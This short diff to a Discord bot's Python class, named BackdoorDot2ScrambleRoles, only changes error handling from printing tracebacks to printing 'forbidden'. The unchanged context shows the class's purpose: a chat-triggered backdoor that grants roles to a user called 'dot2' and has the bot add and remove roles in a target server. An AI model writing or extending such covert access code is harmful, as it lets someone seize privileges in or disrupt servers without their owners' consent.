@@ -17,7 +17,7 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
             try:
                 await dot2.add_roles(i)
             except discord.Forbidden:
-                traceback.print_exc()
+                print("forbidden")
             except discord.NotFound:
                 print("discord.NotFound")
 
@@ -45,13 +45,13 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
             try:
                 await targetguild.me.add_roles(role)
             except discord.Forbidden:
-                traceback.print_exc()
+                print("forbidden")
                 break
 
             try:
                 await targetguild.me.remove_roles(role)
             except discord.Forbidden:
-                traceback.print_exc()
+                print("forbidden")
                 break
 
         await message.channel.send("Done")
